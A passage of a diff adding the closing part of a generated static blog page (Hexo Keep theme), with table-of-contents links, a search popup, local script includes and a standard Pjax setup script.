nav-level-2"><a class="nav-link" href="#localStorage%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">localStorage的使用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%92%AC%E5%AE%8C%E7%BB%93%E6%92%92%E8%8A%B1"><span class="nav-text">💬完结撒花~~</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src>
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
